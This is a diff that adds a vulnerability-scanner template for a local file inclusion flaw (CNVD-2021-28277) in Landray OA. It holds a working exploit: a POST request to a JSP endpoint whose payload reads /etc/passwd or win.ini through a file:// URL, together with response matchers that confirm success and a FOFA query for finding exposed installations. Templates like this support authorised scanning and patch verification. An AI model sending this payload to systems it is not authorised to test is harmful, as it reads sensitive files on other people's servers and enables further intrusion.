@@ -1,0 +1,33 @@
+## id: CNVD-2021-28277
+## name: Landray-OA - Local File Inclusion
+## author: hack007x
+## severity: high
+## tags: cnvd,cnvd2021,landray,lfi,vuln
+## description: Landray-OA is susceptible to local file inclusion.
+## affects: landray_office_automation
+## cvss-score: 8.6
+## reference: https://www.aisoutu.com/a/1432457
+## reference: https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
+## fofa-query: app="Landray OA system"
+## verification: true
+
+#$ payload = {"body":{"file":"file:///etc/passwd"}} | {"body":{"file":"file:///c://windows/win.ini"}}
+
+POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+
+var={{payload}}
+
+#@ stop_scan: true
+#@ condition: and
+#@ matcher: body matches /root:[^:]*:[0-9]+:[0-9]+:/ || body contains "[fonts]" && body contains "[extensions]"
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: c6f968b9243638d81da8817c8e1910f2541c02ed8571d583eb4eb449847d75d8
